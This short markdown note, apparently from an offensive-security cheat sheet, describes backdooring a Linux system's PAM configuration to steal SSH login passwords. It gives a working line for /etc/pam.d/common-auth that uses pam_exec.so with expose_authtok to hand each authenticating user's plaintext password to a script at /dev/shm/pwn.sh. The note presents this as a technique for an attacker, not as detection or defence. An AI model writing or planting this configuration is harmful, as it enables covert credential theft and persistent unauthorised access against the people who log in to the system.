# Intresting technique: 

Getting ssh keys and logins by modifing auth /etc/pam.d/common-auth for striping keys/passwords from ssh login to Attacker


File that executes actual files - pam_exec.so
expose_authtok - expose the password
By adding last line we give 

```
# and here are more per-package modules (the "Additional" block)
# end of pam-auth-update config
auth    optional            pam_exec.so quiet   expose_authtok  /dev/shm/pwn.sh

```
